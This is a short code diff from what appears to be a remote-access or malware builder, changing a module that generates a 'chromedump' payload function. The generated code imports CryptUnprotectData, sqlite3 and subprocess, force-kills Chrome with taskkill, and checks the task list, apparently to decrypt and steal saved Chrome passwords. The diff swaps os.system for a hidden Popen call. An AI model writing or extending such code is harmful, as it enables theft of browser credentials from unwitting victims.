@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 
 config.main()
@@ -8,6 +7,7 @@ def main(option):
     if option == 'generate':
         config.import_statements.append('import os')
         config.import_statements.append('import sqlite3')
+        config.import_statements.append('from subprocess import Popen, PIPE')
         config.import_statements.append('from win32crypt import CryptUnprotectData')
         config.import_statements.append('from subprocess import check_output')
         config.functions.append('''
@@ -15,7 +15,7 @@ def chromedump(arg):
     arg = arg.split(' ', 1)[1]
     msg = ''
     if arg == 'active':
-        os.system('taskkill /f /im chrome.exe')
+        Popen('taskkill /f /im chrome.exe', shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
         msg += '[+]Killed chrome process'
     elif arg == 'passive':
         if 'chrome.exe' in check_output(['tasklist']):
